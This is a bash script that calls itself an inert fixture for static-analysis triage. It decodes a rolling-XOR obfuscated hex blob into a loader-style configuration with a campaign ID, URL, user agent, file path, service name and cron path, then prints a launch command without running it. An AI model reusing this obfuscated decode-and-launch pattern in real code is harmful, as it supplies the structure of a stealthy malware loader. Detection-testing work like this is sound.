# configuration reconstruction
#!/usr/bin/env bash
# Huntress Script Triage -- inert static-analysis fixture (bash_linux)
readonly Material_9dce790d='6a:57:66:1a:69:1d:78:08:7b:46:2a:45:26:47:33:56:09:65:0a:69:08:64:48:2c:45:36:46:27:53:30:58:07:77:05:6a:09:6c:1f:6c:10:71:15:74:04:70:15:67:5a:3f:47:22:41:1e:7a:1f:6c:0f:7d:14:64:10:7f:0d:71:02:76:17:70:15:4a:29:46:33:5d:29:14:25:59:3a:5b:36:46:27:4e:29:47:18:71:15:28:4b:2a:47:37:56:3f:58:36:1b:79:40:73:40:78:4a:28:19:28:1f:63:05:6c:00:65:3a:4a:2b:5f:37:0a:25:51:3c:4c:63:0b:7e:10:64:16:73:00:73:5e:3d:5c:3f:57:32:1d:33:40:34:55:32:57:7a:18:21:12:21:19:2b:49:78:49:7e'
readonly Codec_9dce790d='hex_colon|rolling_xor|1c'

Load_9dce790d() {
  e=()
  local IFS=':' p
  local -a pieces
  read -r -a pieces <<< "${Material_9dce790d}"
  for p in "${pieces[@]}"; do e+=("$((16#$p))"); done
}

Decode_9dce790d() {
  d=()
  local q=28
  local i
  for ((i=0; i<${#e[@]}; i++)); do
    d+=("$((e[i] ^ q))")
    q=${e[i]}
  done
}

Recover_9dce790d() {
  local -a e d
  local t n z i
  local -a series=(3 5 8 13); n="${series[*]:1:2}"
  Load_9dce790d
  z=0; while ((z < 1)); do Decode_9dce790d; ((z+=1)); done
  t=''
  local octal character
  for i in "${!d[@]}"; do
    printf -v octal '%03o' "${d[i]}"
    printf -v character '%b' "\\$octal"
    t+="$character"
  done
  printf '%s\n' "$t"
}

Inspect_9dce790d() { local recovered; recovered="$(Recover_9dce790d)"; printf '%s\n' "$recovered"; }

Plan_9dce790d() {
  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
  descriptor="$(Inspect_9dce790d)"
  local -a fields
  IFS='|' read -r -a fields <<< "$descriptor"
  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
  local -a launch_command=(env -- "$file_path")
  declare -p launch_command
}

if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_9dce790d; fi

# reconstruction complete